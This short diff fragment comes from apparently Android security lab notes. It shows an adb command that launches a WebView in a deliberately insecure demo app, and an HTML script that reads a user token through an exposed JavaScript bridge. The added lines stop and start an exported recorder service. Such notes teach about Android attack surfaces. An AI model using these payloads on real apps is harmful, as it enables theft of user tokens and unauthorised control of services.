@@ -43,3 +43,7 @@ adb shell am start -n com.example.insecurewebview/.SupportWebView --es support_u
 <script type="text/javascript">
 alert("token: " + Android.getUserToken());
 </script>
+
+
+adb shell am stopservice com.example.insecureservice/.RecorderService
+adb shell am startservice com.example.insecureservice/.RecorderService
